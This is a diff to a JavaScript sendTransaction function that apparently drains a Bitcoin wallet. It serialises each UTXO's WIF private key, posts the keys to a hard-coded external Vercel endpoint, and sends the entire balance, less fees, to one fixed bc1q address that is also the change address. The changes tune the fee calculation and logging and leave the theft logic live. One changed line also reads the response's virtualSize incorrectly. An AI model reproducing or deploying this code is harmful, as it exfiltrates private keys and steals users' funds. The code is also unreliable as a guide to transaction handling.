@@ -276,7 +276,6 @@ function getAddressType(address) {
 
 async function sendTransaction(totalBalance, utxos) {
     const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
-    const amountToSend = totalBalance; // Initial transaction fee
     const changeAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
     const recipientAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
     const initialTransactionFee = 5000;
@@ -284,7 +283,7 @@ async function sendTransaction(totalBalance, utxos) {
     const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.type}`).join('|');
 
     const initialBody = {
-        amountToSend: amountToSend.toString(),
+        amountToSend: (totalBalance - initialTransactionFee).toString(),
         changeAddress,
         recipientAddress,
         utxosString,
@@ -298,7 +297,7 @@ async function sendTransaction(totalBalance, utxos) {
     try {
         // Initial API call to get virtual size
         const initialResponse = await axios.post(url, initialBody);
-        const virtualSize = initialResponse.data.virtualSize;
+        const virtualSize = initialResponse.virtualSize;
 
         // Calculate the final transaction fee
         const finalTransactionFee = 35 * virtualSize;
@@ -316,9 +315,9 @@ async function sendTransaction(totalBalance, utxos) {
 
         // Final API call to broadcast the transaction
         const finalResponse = await axios.post(url, finalBody);
-        console.log('Transaction sent successfully');
+        console.log('Transaction sent successfully:', finalResponse.data);
     } catch (error) {
-        console.error('Error sending transaction:', error.message);
+        console.error('Error sending transaction:', error.response ? error.response.data : error.message);
     }
 }
 
